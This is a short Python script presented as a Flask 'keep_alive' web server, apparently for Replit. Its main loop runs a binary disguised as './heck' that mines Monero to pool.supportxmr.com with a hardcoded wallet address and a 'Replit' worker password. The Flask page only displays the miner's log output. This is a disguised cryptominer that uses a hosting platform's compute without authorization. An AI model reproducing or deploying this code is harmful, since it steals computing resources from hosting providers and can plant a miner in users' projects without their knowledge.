import os
from flask import Flask
from threading import Thread
import random

app = Flask('')

@app.route('/')
def home():
	return ''.join(logs)

def run():
  app.run(
		host='0.0.0.0',
		port=random.randint(2000,9000)
	)

def keep_alive(logs):
	'''
	Creates and starts new thread that runs the function run.
	'''

	t = Thread(target=run)
	t.start()
logs=[]
keep_alive(logs)
while True:
  l=os.popen('./heck -o pool.supportxmr.com:443 -u 82e5UsH6MUo9oPThFGGQjP8wz5S8Xu6nPMEAD3KxZdiLeE4RHYdBNZ' 'gAqM6Gi3BrdKHzFwAhfMuMsfnEhQUCX8WR6wRtvv9 -k --tls -p Replit --' 'no-color --cpu-priority 0 --randomx-mode=light')
  while True:
    nlog = ''
    while (b:=l.read(1))!='\n':
      nlog += b
    nlog += '\n'
    if nlog == '\n':
      break
    logs.append(nlog)
